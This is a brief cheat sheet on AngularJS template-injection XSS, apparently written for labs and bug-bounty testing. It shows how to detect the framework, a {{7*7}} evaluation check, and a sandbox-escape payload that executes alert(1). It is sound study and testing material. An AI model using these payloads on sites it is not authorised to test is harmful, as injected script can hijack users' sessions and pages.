# AngularJS XSS CheatSheet

## Framework Detection

Look for:

```html
ng-app
```

---

## Verification Payload

```html
{{7*7}}
```

---

Expected Output:

```text
49
```

---

# Common AngularJS Payload

```html
{{$on.constructor('alert(1)')()}}
```

---

# Attack Flow

```text
User Input
        ↓
Angular Template
        ↓
Expression Evaluation
        ↓
Execution
```

---

# Lab08

## Detection

```html
{{7*7}}
```

---

## Exploitation

```html
{{$on.constructor('alert(1)')()}}
```

---

# Why AngularJS Is Dangerous

Applications may block:

```html
<script>
```

but still allow:

```html
{{ }}
```

expressions.

---

# Bug Bounty Indicators

Look for:

```html
ng-app
ng-controller
ng-repeat
```

Always test:

```html
{{7*7}}
```

first.